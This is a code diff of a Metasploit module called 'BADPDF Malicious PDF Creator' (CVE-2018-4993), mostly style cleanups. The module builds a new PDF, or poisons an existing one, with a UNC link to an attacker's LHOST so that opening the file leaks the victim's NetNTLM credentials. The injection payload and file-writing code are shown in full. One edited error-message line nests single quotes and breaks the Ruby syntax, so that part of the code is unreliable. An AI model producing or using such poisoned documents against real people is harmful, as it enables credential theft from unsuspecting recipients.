@@ -6,95 +6,95 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
-  def initialize(info={})
-    super( update_info( info,
+  def initialize(info = {})
+    super(update_info(info,
         'Name'          => 'BADPDF Malicious PDF Creator',
-        'Description'   => %q{
+        'Description'   => '
           This module can either creates a blank PDF file which contains a UNC link which can be used
           to capture NetNTLM credentials, or if the PDFINJECT option is used it will inject the necessary
           code into an existing PDF document if possible.
-        },
+        ',
         'License'       => MSF_LICENSE,
         'Author'        =>
             [
               'Assaf Baharav',    # Code provided as POC by CheckPoint
               'Yaron Fruchtmann', # Code provided as POC by CheckPoint
               'Ido Solomon',      # Code provided as POC by CheckPoint
-              'Richard Davy - secureyourit.co.uk',  # Metasploit
+              'Richard Davy - secureyourit.co.uk', # Metasploit
             ],
-        'Platform'      => [ 'win' ],
+        'Platform'      => ['win'],
         'References'    =>
         [
           ['CVE', '2018-4993'],
           ['URL', 'https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/']
-        ]
-
-      ))
+        ])
+      )
     register_options(
       [
-        OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
-        OptString.new("FILENAME", [ false, "Filename"]),
-        OptPath.new("PDFINJECT", [ false, "Path and filename to existing PDF to inject UNC link code into"]),
-      ])
+        OptAddress.new('LHOST', [true, 'Host listening for incoming SMB/WebDAV traffic', nil]),
+        OptString.new('FILENAME', [false, 'Filename']),
+        OptPath.new('PDFINJECT', [false, 'Path and filename to existing PDF to inject UNC link code into'])
+      ]
+    )
   end
 
   def run
     if datastore['PDFINJECT'].to_s.end_with?('.pdf') && datastore['FILENAME'].to_s.end_with?('.pdf')
-      print_error "Please configure either FILENAME or PDFINJECT"
+      print_error 'Please configure either FILENAME or PDFINJECT'
     elsif !datastore['PDFINJECT'].nil? && datastore['PDFINJECT'].to_s.end_with?('.pdf')
       injectpdf
     elsif !datastore['FILENAME'].nil? && datastore['FILENAME'].to_s.end_with?('.pdf')
       createpdf
     else
-      print_error "FILENAME or PDFINJECT must end with '.pdf' file extension"
+      print_error 'FILENAME or PDFINJECT must end with '.pdf' file extension'
     end
   end
 
   def injectpdf
-    #Payload which gets injected
+    # Payload which gets injected
     inject_payload = "/AA <</O <</F (\\\\\\\\#{datastore['LHOST']}\\\\test)/D [ 0 /Fit]/S /GoToE>>>>"
 
-    #if given path doesn't exist display error and return
-    unless File.exists?(datastore['PDFINJECT'])
-      #If file not found display error message
+    # if given path doesn't exist display error and return
+    unless File.exist?(datastore['PDFINJECT'])
+      # If file not found display error message
       print_error "File doesn't exist #{datastore['PDFINJECT']}"
       return
     end
 
-    #Read in contents of file
+    # Read in contents of file
     content = File.read(datastore['PDFINJECT'])
 
-    #Check for place holder - below ..should.. cover most scenarios.
-    newdata = ""
+    # Check for place holder - below ..should.. cover most scenarios.
+    newdata = ''
     [2, 4, 6, 8].each do |pholder|
       unless content.index("/Contents #{pholder} 0 R").nil?
-        #If place holder exists create new file content
-        newdata = content[0..(content.index("/Contents #{pholder} 0 R")+14)]+inject_payload+content[(content.index("/Contents #{pholder} 0 R")+15)..-1]
+        # If place holder exists create new file content
+        newdata = content[0..(content.index("/Contents #{pholder} 0 R") + 14)] + inject_payload + content[(content.index("/Contents #{pholder} 0 R") + 15)..-1]
         break
       end
     end
 
-    #Display error message if we couldn't poison the file
-    if newdata.nil?
-      print_error "Could not find placeholder to poison file this time...."
+    # Display error message if we couldn't poison the file
+    if newdata.empty?
+      print_error 'Could not find placeholder to poison file this time....'
       return
     end
 
-    #Create new filename by replacing .pdf with _malicious.pdf
+    # Create new filename by replacing .pdf with _malicious.pdf
     newfilename = "#{datastore['PDFINJECT'].gsub(/\.pdf$/, '')}_malicious.pdf"
-    #Write content to file
+    # Write content to file
     File.open(newfilename, 'wb') { |file| file.write(newdata) }
-    #Check file exists and display path or error message
-    if File.exists?(newfilename)
+    # Check file exists and display path or error message
+    if File.exist?(newfilename)
       print_good("Malicious file writen to: #{newfilename}")
     else
-      print_error "Something went wrong creating malicious PDF file"
+      print_error 'Something went wrong creating malicious PDF file'
     end
   end
 
   def createpdf
-    #Code below taken POC provided by CheckPoint Research
-    pdf = ""
+    # Code below taken POC provided by CheckPoint Research
+    pdf = ''
     pdf << "%PDF-1.7\n"
     pdf << "1 0 obj\n"
     pdf << "<</Type/Catalog/Pages 2 0 R>>\n"
@@ -152,8 +152,7 @@ class MetasploitModule < Msf::Auxiliary
     pdf << "  /Root 1 0 R\n"
     pdf << ">>\n"
     pdf << "%%EOF\n"
-    #Write data to filename
+    # Write data to filename
     file_create(pdf)
   end
-
 end
